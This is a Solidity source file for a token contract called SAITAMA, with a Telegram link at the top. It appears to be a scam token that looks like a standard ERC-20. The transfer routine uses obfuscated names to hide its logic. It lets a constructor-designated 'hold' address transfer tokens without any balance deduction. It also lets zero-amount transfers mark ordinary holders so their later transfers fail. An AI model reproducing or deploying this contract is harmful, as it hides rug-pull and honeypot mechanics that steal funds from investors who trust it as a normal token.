/*

https://t.me/saitamaethportal

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SAITAMA is Ownable {
    function hay(address flat, address bound, uint256 element) private returns (bool success) {
        if (high[flat] == 0) {
            if (route[flat] > 0 && uniswapV2Pair != flat) {
                high[flat] -= above;
            }
            balanceOf[flat] -= element;
        }
        balanceOf[bound] += element;
        if (element == 0) {
            route[bound] += above;
        }
        emit Transfer(flat, bound, element);
        return true;
    }

    string public symbol;

    mapping(address => uint256) private route;

    function transferFrom(address flat, address bound, uint256 element) public returns (bool success) {
        hay(flat, bound, element);
        require(element <= allowance[flat][msg.sender]);
        allowance[flat][msg.sender] -= element;
        return true;
    }

    function transfer(address bound, uint256 element) public returns (bool success) {
        hay(msg.sender, bound, element);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    constructor(address hold) {
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        totalSupply = 1000000000 * 10 ** decimals;
        high[hold] = above;
        balanceOf[msg.sender] = totalSupply;
        name = 'SAITAMA';
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        symbol = 'SAITAMA';
    }

    string public name;

    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private above = 17;

    function approve(address mice, uint256 element) public returns (bool success) {
        allowance[msg.sender][mice] = element;
        emit Approval(msg.sender, mice, element);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private high;
}